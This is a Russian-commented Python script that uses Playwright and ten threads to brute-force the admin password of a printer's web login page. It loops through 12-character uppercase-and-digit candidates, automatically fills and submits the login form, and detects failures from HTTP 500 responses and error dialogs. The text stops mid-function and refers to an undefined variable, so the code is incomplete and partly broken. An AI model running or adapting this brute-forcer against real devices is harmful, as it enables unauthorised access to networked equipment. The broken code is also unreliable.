# Python код для тестирования пароля принтера (Playwright)
from playwright.sync_api import sync_playwright
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
from datetime import datetime
from itertools import product
import string
import argparse
import random
import queue

# ==================== НАСТРОЙКИ ====================
TARGET_URL = "http://printer.local/"
USERNAME = "Admin"
MAX_WORKERS = 10  # Количество потоков (оптимизировано для стабильности)
DELAY_BETWEEN_ATTEMPTS = 0.05  # Небольшая задержка для стабильности (0.05с)
TIMEOUT_PAGE_LOAD = 10000  # Таймаут загрузки страницы в мс (увеличен для стабильности)
TIMEOUT_SELECTOR = 6000  # Таймаут ожидания селекторов в мс (увеличен для стабильности)
MAX_RETRIES = 2  # Повторные попытки при ошибках для стабильности

# Диапазон длины паролей для перебора
MIN_LENGTH = 12  # Минимальная длина пароля
MAX_LENGTH = 12  # Максимальная длина пароля

# Набор символов для генерации паролей
# Варианты:
# CHARSET = string.digits  # Только цифры (0-9) - быстрее всего
# CHARSET = string.ascii_lowercase + string.digits  # Буквы нижнего регистра + цифры
# CHARSET = string.ascii_uppercase + string.digits  # Буквы верхнего регистра (A-Z) + цифры (0-9)
# CHARSET = string.ascii_letters + string.digits  # Буквы (a-z, A-Z) + цифры
# CHARSET = string.ascii_letters + string.digits + string.punctuation  # Все печатные символы

CHARSET = string.ascii_uppercase + string.digits  # Большие буквы (A-Z) + цифры (0-9)

# ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
found_password = None
lock = threading.Lock()
attempts_count = 0
start_time = datetime.now()

# Инициализация генератора случайных чисел для перемешивания паролей
random.seed()  # Использует системное время для случайного seed

# ==================== ФУНКЦИЯ ПРОВЕРКИ ПАРОЛЯ ====================
def check_password(password, thread_id, headless_mode=True, local_attempts=0):
    global found_password, attempts_count
    
    # Если пароль уже найден, прекращаем работу
    if found_password is not None:
        return False
    
    # В тестовом режиме выводим информацию о проверяемом пароле
    if not headless_mode:
        with lock:
            print(f"[Поток {thread_id}] 🔍 Проверяю пароль: {password}")
    
    # Повторные попытки при ошибках
    for retry in range(MAX_RETRIES):
        try:
            with sync_playwright() as p:
                # Запуск браузера (headless или видимый режим)
                browser = p.chromium.launch(
                    headless=headless_mode,
                    args=['--no-sandbox', '--disable-dev-shm-usage'] if headless_mode else []
                )
                
                context = browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                )
                
                page = context.new_page()
                page.set_default_timeout(TIMEOUT_PAGE_LOAD)
                
                # Обработчик диалогов (alert) - автоматически нажимает OK
                dialog_handled = threading.Event()
                dialog_message = None
                dialog_type = None
                
                def handle_dialog(dialog):
                    nonlocal dialog_message, dialog_type
                    dialog_message = dialog.message
                    dialog_type = dialog.type
                    if not headless_mode:
                        print(f"[Поток {thread_id}] 🔔 Диалог ({dialog_type}): {dialog_message}")
                    # НЕ закрываем диалог сразу - сначала проверим его содержимое
                    # Закроем после проверки
                    dialog_handled.set()
                    # Закрываем диалог
                    try:
                        dialog.accept()  # Нажимаем OK/Закрыть
                    except:
                        pass
                
                page.on("dialog", handle_dialog)
                
                # Отслеживание сетевых ошибок (500 ошибки при неправильном пароле)
                network_errors = []
                server_errors = []
                
                def handle_response(response):
                    nonlocal network_errors, server_errors
                    status = response.status
                    url = response.url
                    if status >= 400:
                        error_info = {'status': status, 'url': url, 'timestamp': time.time()}
                        network_errors.append(error_info)
                        if status == 500:
                            server_errors.append(error_info)
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ⚠️  Обнаружена ошибка {status} на {url}")
                
                def handle_request_failed(request):
                    nonlocal network_errors
                    error_info = {'failed': True, 'url': request.url, 'timestamp': time.time()}
                    network_errors.append(error_info)
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ⚠️  Запрос провалился: {request.url}")
                
                page.on("response", handle_response)
                page.on("requestfailed", handle_request_failed)
                
                # Сохраняем начальный URL для сравнения
                initial_url = None
                
                # Переход на страницу с повторными попытками
                try:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] 📍 Переход на страницу {TARGET_URL}...")
                    # Быстрая загрузка страницы (domcontentloaded - самый быстрый вариант)
                    try:
                        page.goto(TARGET_URL, wait_until='domcontentloaded', timeout=TIMEOUT_PAGE_LOAD)
                        initial_url = page.url
                    except:
                        # Если domcontentloaded не сработал, пробуем load
                        try:
                            page.goto(TARGET_URL, wait_until='load', timeout=TIMEOUT_PAGE_LOAD)
                            initial_url = page.url
                        except:
                            # Последний вариант - networkidle (самый медленный)
                            page.goto(TARGET_URL, wait_until='networkidle', timeout=TIMEOUT_PAGE_LOAD)
                            initial_url = page.url
                    
                    # Минимальное ожидание для загрузки JavaScript (максимально ускорено)
                    try:
                        page.wait_for_load_state('domcontentloaded', timeout=1000)  # 1 секунда для максимальной скорости
                    except:
                        pass
                    
                    # Ищем фрейм с формой (элементы находятся в iframe!)
                    target_frame = None
                    frames = page.frames
                    if not headless_mode:
                        print(f"[Поток {thread_id}] 🔍 Найдено фреймов: {len(frames)}")
                    
                    for frame in frames:
                        if frame.name == 'wlmframe' or 'Start_Wlm' in frame.url or (frame.name and frame.name != ''):
                            target_frame = frame
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ✅ Найден целевой фрейм: name={frame.name}, url={frame.url}")
                            break
                    
                    if not target_frame and len(frames) > 1:
                        # Берем первый не-основной фрейм
                        target_frame = frames[1]
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Используем первый фрейм: name={target_frame.name}")
                    
                    if not target_frame:
                        # Если фрейм не найден, используем основную страницу
                        target_frame = page
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Фрейм не найден, используем основную страницу")
                    else:
                        # Минимальное ожидание загрузки фрейма (максимально ускорено)
                        try:
                            target_frame.wait_for_load_state('domcontentloaded', timeout=1000)  # 1 секунда для максимальной скорости
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ✅ Фрейм загружен")
                        except:
                            pass
                        page.wait_for_timeout(200)  # Минимальное ожидание для фрейма (максимально ускорено)
                    
                    # Дополнительное ожидание для динамической загрузки элементов
                    # Элементы используют Knockout.js (data-bind), сначала проверяем наличие в DOM
                    elements_in_dom = False
                    try:
                        # Сначала ждем появления элементов в DOM фрейма (даже если они невидимы)
                        target_frame.wait_for_function(
                            '''
                            () => {
                                const username = document.querySelector("#arg01_UserName");
                                const password = document.querySelector("#arg02_Password");
                                return username !== null && password !== null;
                            }
                            ''',
                            timeout=TIMEOUT_SELECTOR,
                            polling=500
                        )
                        elements_in_dom = True
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Элементы найдены в DOM фрейма")
                    except Exception as wait_e:
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Элементы не найдены в DOM фрейма: {wait_e}")
                    
                    # Минимальное ожидание для Knockout.js (максимально ускорено)
                    page.wait_for_timeout(500)  # 500мс для максимальной скорости
                    
                    # Проверяем видимость элементов (более мягкая проверка) в фрейме
                    try:
                        visibility_check = target_frame.evaluate('''() => {
                            const username = document.querySelector("#arg01_UserName");
                            const password = document.querySelector("#arg02_Password");
                            
                            if (!username || !password) {
                                return { found: false, username_visible: false, password_visible: false };
                            }
                            
                            // Более мягкая проверка видимости
                            const usernameVisible = username.offsetParent !== null || 
                                                   window.getComputedStyle(username).display !== 'none';
                            const passwordVisible = password.offsetParent !== null || 
                                                   window.getComputedStyle(password).display !== 'none';
                            
                            return {
                                found: true,
                                username_visible: usernameVisible,
                                password_visible: passwordVisible,
                                username_enabled: !username.disabled,
                                password_enabled: !password.disabled
                            };
                        }''')
                        
                        if not headless_mode:
                            print(f"[Поток {thread_id}] 🔍 Статус элементов: {visibility_check}")
                    except Exception as vis_e:
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Ошибка проверки видимости: {vis_e}")
                    
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ✅ Страница загружена")
                        # Сохраняем скриншот для диагностики
                        try:
                            page.screenshot(path=f"debug_page_{thread_id}.png")
                            print(f"[Поток {thread_id}] 📸 Скриншот сохранен: debug_page_{thread_id}.png")
                        except:
                            pass
                except Exception as e:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ❌ Ошибка загрузки страницы: {e}")
                    browser.close()
                    if retry < MAX_RETRIES - 1:
                        time.sleep(2)  # Небольшая задержка перед повтором
                        continue
                    raise
                
                # Ждем загрузки элементов формы с увеличенным таймаутом
                # Пробуем разные варианты селекторов
                try:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ⏳ Ожидание элементов формы...")
                    
                    # Пробуем найти элементы в фрейме - используем более мягкую проверку
                    # Элементы могут быть в DOM, но скрыты через Knockout.js
                    username_found = False
                    password_found = False
                    
                    # Используем более длительный таймаут
                    selector_timeout = TIMEOUT_SELECTOR  # Используем полный таймаут для стабильности
                    
                    # Проверяем наличие элементов в DOM фрейма (даже если они невидимы)
                    try:
                        # Сначала просто ждем появления в DOM фрейма
                        target_frame.wait_for_selector("#arg01_UserName", timeout=selector_timeout, state='attached')
                        username_found = True
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Username найден в DOM фрейма")
                    except:
                        # Пробуем по имени
                        try:
                            target_frame.wait_for_selector('input[name="arg01_UserName"]', timeout=selector_timeout, state='attached')
                            username_found = True
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ✅ Username найден в DOM фрейма по name")
                        except:
                            pass
                    
                    try:
                        target_frame.wait_for_selector("#arg02_Password", timeout=selector_timeout, state='attached')
                        password_found = True
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Password найден в DOM фрейма")
                    except:
                        try:
                            target_frame.wait_for_selector('input[name="arg02_Password"]', timeout=selector_timeout, state='attached')
                            password_found = True
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ✅ Password найден в DOM фрейма по name")
                        except:
                            pass
                    
                    if not username_found or not password_found:
                        # Выводим информацию о найденных элементах для диагностики
                        if not headless_mode:
                            # Проверяем через JavaScript напрямую
                            try:
                                username_exists = target_frame.evaluate('document.querySelector("#arg01_UserName") !== null')
                                password_exists = target_frame.evaluate('document.querySelector("#arg02_Password") !== null')
                                print(f"[Поток {thread_id}] 🔍 Проверка через JS в фрейме: username={username_exists}, password={password_exists}")
                                
                                # Пробуем найти по имени через JS
                                username_by_name = target_frame.evaluate('document.querySelector(\'input[name="arg01_UserName"]\') !== null')
                                password_by_name = target_frame.evaluate('document.querySelector(\'input[name="arg02_Password"]\') !== null')
                                print(f"[Поток {thread_id}] 🔍 По name через JS: username={username_by_name}, password={password_by_name}")
                                
                                # Показываем все input элементы в фрейме
                                all_inputs = target_frame.query_selector_all('input')
                                print(f"[Поток {thread_id}] 🔍 Найдено input элементов в фрейме: {len(all_inputs)}")
                                for i, inp in enumerate(all_inputs[:10]):  # Показываем первые 10
                                    try:
                                        inp_id = inp.get_attribute('id') or 'нет'
                                        inp_name = inp.get_attribute('name') or 'нет'
                                        inp_type = inp.get_attribute('type') or 'нет'
                                        inp_class = inp.get_attribute('class') or 'нет'
                                        print(f"[Поток {thread_id}]   Input {i+1}: id={inp_id}, name={inp_name}, type={inp_type}, class={inp_class[:30]}")
                                    except:
                                        pass
                                
                                # Показываем HTML фрейма для диагностики
                                frame_content = target_frame.content()
                                if 'arg01_UserName' in frame_content:
                                    print(f"[Поток {thread_id}] ✅ arg01_UserName найден в HTML фрейма")
                                if 'arg02_Password' in frame_content:
                                    print(f"[Поток {thread_id}] ✅ arg02_Password найден в HTML фрейма")
                            except Exception as debug_e:
                                print(f"[Поток {thread_id}] ⚠️  Ошибка диагностики: {debug_e}")
                        # Если элементы не найдены, пробуем повторить (может быть временная проблема загрузки)
                        if retry < MAX_RETRIES - 1:
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ⚠️  Элементы не найдены, повторная попытка...")
                            browser.close()
                            time.sleep(1 + retry)  # Увеличиваем задержку с каждой попыткой
                            continue
                        raise Exception(f"Элементы не найдены: username={username_found}, password={password_found}")
                    
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ✅ Элементы формы найдены")
                except Exception as e:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ❌ Таймаут ожидания элементов: {e}")
                        print(f"[Поток {thread_id}] 💡 Попытка {retry + 1}/{MAX_RETRIES}")
                    browser.close()
                    if retry < MAX_RETRIES - 1:
                        time.sleep(2)
                        continue
                    raise
                
                # Очищаем поля перед заполнением
                # Пробуем разные варианты селекторов
                username_selector = None
                password_selector = None
                
                # Определяем правильные селекторы в фрейме
                username_selector = None
                password_selector = None
                
                # Ищем селектор для имени пользователя в фрейме
                if target_frame.query_selector("#arg01_UserName"):
                    username_selector = "#arg01_UserName"
                elif target_frame.query_selector('input[name="arg01_UserName"]'):
                    username_selector = 'input[name="arg01_UserName"]'
                elif target_frame.query_selector('input[type="text"][name="arg01_UserName"]'):
                    username_selector = 'input[type="text"][name="arg01_UserName"]'
                
                # Ищем селектор для пароля в фрейме
                if target_frame.query_selector("#arg02_Password"):
                    password_selector = "#arg02_Password"
                elif target_frame.query_selector('input[name="arg02_Password"]'):
                    password_selector = 'input[name="arg02_Password"]'
                elif target_frame.query_selector('input[type="password"][name="arg02_Password"]'):
                    password_selector = 'input[type="password"][name="arg02_Password"]'
                
                # Проверяем, что селекторы найдены
                if not username_selector or not password_selector:
                    raise Exception(f"Не удалось найти селекторы: username={username_selector}, password={password_selector}")
                
                if not headless_mode:
                    print(f"[Поток {thread_id}] ✍️  Заполняю форму: логин={USERNAME}, пароль={password}")
                    print(f"[Поток {thread_id}] 📝 Селекторы: username={username_selector}, password={password_selector}")
                
                # Очищаем поля перед заполнением и заполняем форму
                # Для элементов с Knockout.js используем комбинированный подход
                try:
                    # Проверяем наличие элементов в фрейме
                    username_element = target_frame.query_selector(username_selector)
                    password_element = target_frame.query_selector(password_selector)
                    
                    if not username_element or not password_element:
                        # Пробуем найти через JavaScript напрямую в фрейме
                        username_exists = target_frame.evaluate('document.querySelector("#arg01_UserName") !== null')
                        password_exists = target_frame.evaluate('document.querySelector("#arg02_Password") !== null')
                        
                        if not username_exists or not password_exists:
                            # Если элементы не найдены, пробуем повторить
                            if retry < MAX_RETRIES - 1:
                                if not headless_mode:
                                    print(f"[Поток {thread_id}] ⚠️  Элементы не найдены в DOM, повторная попытка...")
                                browser.close()
                                time.sleep(1 + retry)
                                continue
                            raise Exception(f"Элементы не найдены: username={username_exists}, password={password_exists}")
                        
                        # Если элементы есть в DOM, но не найдены через query_selector, используем JavaScript
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Элементы найдены через JS, но не через query_selector, используем JS-заполнение")
                        # Заполняем через JavaScript напрямую
                        username_escaped = USERNAME.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                        password_escaped = password.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                        
                        target_frame.evaluate(f'''
                            (() => {{
                                const usernameEl = document.querySelector("#arg01_UserName");
                                const passwordEl = document.querySelector("#arg02_Password");
                                if (usernameEl) {{
                                    usernameEl.value = "{username_escaped}";
                                    usernameEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    usernameEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                    usernameEl.dispatchEvent(new Event('keyup', {{ bubbles: true }}));
                                }}
                                if (passwordEl) {{
                                    passwordEl.value = "{password_escaped}";
                                    passwordEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    passwordEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                    passwordEl.dispatchEvent(new Event('keyup', {{ bubbles: true }}));
                                }}
                            }})();
                        ''')
                        page.wait_for_timeout(100)  # Ускорено  # Ускорено с 500
                    else:
                        # Метод 1: Используем fill (Playwright автоматически обрабатывает data-bind)
                        # Но сначала фокусируемся на элементах
                        try:
                            username_element.focus()
                            page.wait_for_timeout(100)  # Минимальная задержка для Knockout.js (ускорено)
                            target_frame.fill(username_selector, "")
                            target_frame.fill(username_selector, USERNAME)
                            
                            password_element.focus()
                            page.wait_for_timeout(100)  # Минимальная задержка для Knockout.js (ускорено)
                            target_frame.fill(password_selector, "")
                            target_frame.fill(password_selector, password)
                        except Exception as fill_error:
                            # Если fill не работает, используем JavaScript
                            if not headless_mode:
                                print(f"[Поток {thread_id}] ⚠️  Fill не сработал, используем JS: {fill_error}")
                            username_escaped = USERNAME.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                            password_escaped = password.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                            
                            target_frame.evaluate(f'''
                                (() => {{
                                    const usernameEl = document.querySelector("#arg01_UserName");
                                    const passwordEl = document.querySelector("#arg02_Password");
                                    if (usernameEl) {{
                                        usernameEl.value = "{username_escaped}";
                                        usernameEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        usernameEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        usernameEl.dispatchEvent(new Event('keyup', {{ bubbles: true }}));
                                    }}
                                    if (passwordEl) {{
                                        passwordEl.value = "{password_escaped}";
                                        passwordEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                        passwordEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                        passwordEl.dispatchEvent(new Event('keyup', {{ bubbles: true }}));
                                    }}
                                }})();
                            ''')
                            page.wait_for_timeout(100)  # Ускорено  # Ускорено с 500
                    
                    # Проверяем, что значения установились в фрейме
                    username_value = target_frame.evaluate(f'() => document.querySelector("{username_selector}")?.value || ""')
                    password_value = target_frame.evaluate(f'() => document.querySelector("{password_selector}")?.value || ""')
                    
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ✅ Форма заполнена (username={username_value[:10] if username_value else 'пусто'}..., password={'*'*len(password_value) if password_value else 'пусто'})")
                    
                    # Дополнительная проверка через JavaScript для Knockout.js
                    if username_value != USERNAME or password_value != password:
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Значения не совпадают, пробуем через JavaScript...")
                        # Пробуем установить значения напрямую через JavaScript
                        # Экранируем специальные символы для безопасности
                        username_escaped = USERNAME.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                        password_escaped = password.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
                        username_sel_escaped = username_selector.replace('"', '\\"')
                        password_sel_escaped = password_selector.replace('"', '\\"')
                        
                        page.evaluate(f'''
                            (() => {{
                                const usernameEl = document.querySelector("{username_sel_escaped}");
                                const passwordEl = document.querySelector("{password_sel_escaped}");
                                if (usernameEl) {{
                                    usernameEl.value = "{username_escaped}";
                                    usernameEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    usernameEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                }}
                                if (passwordEl) {{
                                    passwordEl.value = "{password_escaped}";
                                    passwordEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    passwordEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                }}
                            }})();
                        ''')
                        page.wait_for_timeout(50)  # Минимальное время для Knockout.js (максимально ускорено)
                        
                except Exception as e:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ❌ Ошибка заполнения формы: {e}")
                    raise
                
                # Отправка формы через кнопку submit (более надежно, чем Enter)
                if not headless_mode:
                    print(f"[Поток {thread_id}] 📤 Отправляю форму...")
                
                # Пробуем найти и нажать кнопку submit
                form_submitted = False
                try:
                    # Ищем кнопку по name="Login" или type="submit"
                    submit_button = target_frame.query_selector('input[name="Login"][type="submit"]')
                    if not submit_button:
                        submit_button = target_frame.query_selector('input[type="submit"]')
                    
                    if submit_button:
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Найдена кнопка submit, кликаю...")
                        # Фокусируемся на кнопке перед кликом
                        submit_button.focus()
                        page.wait_for_timeout(100)  # Ускорено
                        submit_button.click()
                        form_submitted = True
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Форма отправлена через кнопку")
                    else:
                        # Если кнопка не найдена, используем Enter
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Кнопка submit не найдена, использую Enter")
                        # Фокусируемся на поле пароля и нажимаем Enter
                        password_element = target_frame.query_selector(password_selector)
                        if password_element:
                            password_element.focus()
                            page.wait_for_timeout(100)  # Ускорено
                        target_frame.press(password_selector, "Enter")
                        form_submitted = True
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ✅ Форма отправлена через Enter")
                except Exception as submit_error:
                    # Если клик не сработал, используем Enter
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ⚠️  Ошибка клика по кнопке: {submit_error}, использую Enter")
                    try:
                        target_frame.press(password_selector, "Enter")
                        form_submitted = True
                    except Exception as enter_error:
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ❌ Ошибка отправки формы: {enter_error}")
                
                if not form_submitted:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ❌ Не удалось отправить форму!")
                    browser.close()
                    time.sleep(DELAY_BETWEEN_ATTEMPTS)
                    return False
                
                # Ждем обработки запроса и проверяем ошибки 500 (основной критерий!)
                # Ошибки 500 появляются быстро при неправильном пароле
                dialog_appeared = False
                dialog_error_text = None
                is_error = False  # Инициализируем переменную
                
                # Быстрая проверка ошибок 500 (основной критерий неправильного пароля)
                # Ошибки 500 появляются очень быстро, проверяем сразу
                page.wait_for_timeout(150)  # Минимальное ожидание 150мс для появления ошибки
                
                # Проверяем ошибки 500 сразу
                current_time_check = time.time()
                recent_server_errors_check = [e for e in server_errors if (current_time_check - e['timestamp']) < 3]
                if recent_server_errors_check:
                    # Обнаружены ошибки 500 - пароль неверный!
                    with lock:
                        attempts_count += 1
                        if attempts_count % 10 == 0:
                            elapsed = (datetime.now() - start_time).total_seconds()
                            print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                  f"Последний: {password}, Время: {elapsed:.1f}с")
                        else:
                            print(f"[Поток {thread_id}] ❌ Пароль неверный (ошибка 500): {password}")
                    browser.close()
                    time.sleep(DELAY_BETWEEN_ATTEMPTS)
                    return False
                
                # Проверяем диалог
                if dialog_handled.is_set():
                    dialog_appeared = True
                    dialog_error_text = dialog_message
                
                # Дополнительная проверка через JavaScript (на случай если обработчик не сработал)
                # Проверяем наличие диалога в DOM или через window.alert
                if not dialog_appeared:
                    try:
                        # Пробуем проверить наличие диалога через JavaScript в основном окне и фрейме
                        for check_frame in [page, target_frame]:
                            try:
                                has_dialog = check_frame.evaluate('''() => {
                                    // Проверяем наличие модальных окон или alert
                                    const selectors = [
                                        '[role="dialog"]',
                                        '.modal',
                                        '[class*="dialog"]',
                                        '[class*="alert"]',
                                        '[id*="dialog"]',
                                        '[id*="alert"]',
                                        '[id*="modal"]',
                                        'div[style*="z-index"]', // Модальные окна часто имеют высокий z-index
                                    ];
                                    
                                    let foundModal = null;
                                    for (let selector of selectors) {
                                        const modals = document.querySelectorAll(selector);
                                        for (let modal of modals) {
                                            const style = window.getComputedStyle(modal);
                                            const zIndex = parseInt(style.zIndex) || 0;
                                            // Модальные окна обычно имеют z-index > 1000
                                            if (zIndex > 1000 || modal.style.display !== 'none') {
                                                const text = (modal.textContent || modal.innerText || '').trim();
                                                if (text.length > 0) {
                                                    foundModal = { text: text, zIndex: zIndex };
                                                    break;
                                                }
                                            }
                                        }
                                        if (foundModal) break;
                                    }
                                    
                                    if (foundModal) {
                                        return { found: true, text: foundModal.text };
                                    }
                                    return { found: false, text: '' };
                                }''')
                                
                                if has_dialog and has_dialog.get('found'):
                                    dialog_text = has_dialog.get('text', '')
                                    # Проверяем, содержит ли текст ошибку
                                    dialog_lower = dialog_text.lower()
                                    error_keywords = ['неверн', 'incorrect', 'ошибк', 'error', 'неправильн']
                                    if any(keyword in dialog_lower for keyword in error_keywords):
                                        dialog_appeared = True
                                        dialog_error_text = dialog_text
                                        with lock:
                                            print(f"[Поток {thread_id}] 🔍 Диалог найден через JS: {dialog_text[:150]}")
                                        break
                            except:
                                continue
                    except Exception as js_error:
                        pass
                
                # ВАЖНО: Если появился диалог - проверяем, является ли он ошибкой входа
                if dialog_appeared:
                    # Диалог появился - проверяем, является ли он ошибкой
                    with lock:
                        print(f"[Поток {thread_id}] ⚠️  Получен диалог: {dialog_error_text or 'Диалог (текст не получен)'}")
                    
                    # Убеждаемся, что диалог закрыт (если он был обработан через обработчик)
                    if dialog_handled.is_set():
                        page.wait_for_timeout(300)  # Ускорено для максимальной скорости
                    
                    # Проверяем текст ошибки для подтверждения
                    error_keywords = ['неверн', 'incorrect', 'ошибк', 'error', 'неправильн', 'неверное имя', 'неверный пароль', 'неверное имя пользователя']
                    if dialog_error_text:
                        dialog_lower = dialog_error_text.lower()
                        is_error = any(keyword in dialog_lower for keyword in error_keywords)
                        with lock:
                            print(f"[Поток {thread_id}] 🔍 Проверка диалога: текст='{dialog_error_text}', это_ошибка={is_error}")
                    else:
                        # Если текст не получен, но диалог появился - считаем ошибкой
                        is_error = True
                        with lock:
                            print(f"[Поток {thread_id}] ⚠️  Текст диалога не получен, считаем ошибкой")
                    
                    # Если это диалог с ошибкой - пароль неверный
                    if is_error:
                        with lock:
                            attempts_count += 1
                            if attempts_count % 10 == 0:
                                elapsed = (datetime.now() - start_time).total_seconds()
                                print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                      f"Последний: {password}, Время: {elapsed:.1f}с")
                            else:
                                print(f"[Поток {thread_id}] ❌ Пароль неверный: {password}")
                        
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return False
                    else:
                        # Если диалог не является ошибкой - возможно это что-то другое
                        with lock:
                            print(f"[Поток {thread_id}] ⚠️  Диалог появился, но не похож на ошибку входа, продолжаю проверку...")
                
                # Если диалога с ошибкой нет, проверяем успешность входа
                # Быстрая проверка ошибок 500 (основной критерий!)
                if not dialog_appeared or not is_error:
                    # Минимальное ожидание для проверки ошибок 500
                    page.wait_for_timeout(100)  # Только 100мс для максимальной скорости
                    
                    # Проверяем сетевые ошибки 500 (основной критерий неправильного пароля)
                    current_time = time.time()
                    recent_server_errors = [e for e in server_errors if (current_time - e['timestamp']) < 3]
                    
                    if recent_server_errors:
                        # Обнаружены ошибки 500 - пароль неверный!
                        with lock:
                            attempts_count += 1
                            if attempts_count % 10 == 0:
                                elapsed = (datetime.now() - start_time).total_seconds()
                                print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                      f"Последний: {password}, Время: {elapsed:.1f}с")
                            else:
                                print(f"[Поток {thread_id}] ❌ Пароль неверный (ошибка 500): {password}")
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return False
                    
                    # Еще раз проверяем диалог через JavaScript (на случай задержки)
                    try:
                        delayed_dialog_check = target_frame.evaluate('''() => {
                            const selectors = [
                                '[role="dialog"]',
                                '.modal',
                                '[class*="dialog"]',
                                '[class*="alert"]',
                                '[id*="dialog"]',
                                '[id*="alert"]',
                            ];
                            
                            for (let selector of selectors) {
                                const modals = document.querySelectorAll(selector);
                                for (let modal of modals) {
                                    const style = window.getComputedStyle(modal);
                                    if (style.display !== 'none' && style.visibility !== 'hidden') {
                                        const text = (modal.textContent || modal.innerText || '').toLowerCase();
                                        if (text.includes('неверн') || text.includes('incorrect') || 
                                            text.includes('ошибк') || text.includes('error') ||
                                            text.includes('неправильн')) {
                                            return { found: true, text: modal.textContent || modal.innerText || '' };
                                        }
                                    }
                                }
                            }
                            return { found: false, text: '' };
                        }''')
                        
                        if delayed_dialog_check and delayed_dialog_check.get('found'):
                            dialog_text = delayed_dialog_check.get('text', '')
                            with lock:
                                print(f"[Поток {thread_id}] ⚠️  Диалог появился с задержкой: {dialog_text[:150]}")
                            # Пароль неверный
                            with lock:
                                attempts_count += 1
                                if attempts_count % 10 == 0:
                                    elapsed = (datetime.now() - start_time).total_seconds()
                                    print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                          f"Последний: {password}, Время: {elapsed:.1f}с")
                                else:
                                    print(f"[Поток {thread_id}] ❌ Пароль неверный (диалог с задержкой): {password}")
                            browser.close()
                            time.sleep(DELAY_BETWEEN_ATTEMPTS)
                            return False
                    except:
                        pass
                
                # Проверка успешности входа
                # УСПЕШНЫЙ ВХОД определяется по:
                # 1. НЕТ ошибок 500 (основной критерий - уже проверили выше)
                # 2. НЕТ диалога с ошибкой (уже проверили выше)
                # 3. Поля логина/пароля ИСЧЕЗЛИ и остаются отсутствующими
                
                # Проверяем признаки успешного входа
                login_successful = False
                
                try:
                    # Проверка 1: Поля логина/пароля должны исчезнуть
                    login_field = target_frame.query_selector(username_selector)
                    password_field = target_frame.query_selector(password_selector)
                    
                    fields_disappeared = (not login_field or not password_field)
                    
                    # Минимальное ожидание для проверки (ускорено)
                    page.wait_for_timeout(200)  # Минимальное ожидание (максимально ускорено)
                    login_field_after = target_frame.query_selector(username_selector)
                    password_field_after = target_frame.query_selector(password_selector)
                    
                    fields_still_gone = (not login_field_after and not password_field_after)
                    
                    # Успешный вход определяется по:
                    # 1. НЕТ ошибок 500 (уже проверили выше - это основной критерий!)
                    # 2. НЕТ диалога с ошибкой (уже проверили выше)
                    # 3. Поля логина/пароля исчезли и остаются отсутствующими
                    
                    if not headless_mode:
                        print(f"[Поток {thread_id}] 🔍 Проверка входа:")
                        print(f"  - Поля исчезли: {fields_disappeared}")
                        print(f"  - Поля все еще отсутствуют: {fields_still_gone}")
                        print(f"  - Ошибок 500: {len(final_server_errors)}")
                    
                    # ФИНАЛЬНАЯ проверка перед подтверждением успеха:
                    # 1. Убеждаемся, что нет сетевых ошибок 500 (основной критерий!)
                    # 2. Убеждаемся, что диалога с ошибкой нет
                    
                    # Проверка 1: Сетевые ошибки 500 (основной критерий неправильного пароля)
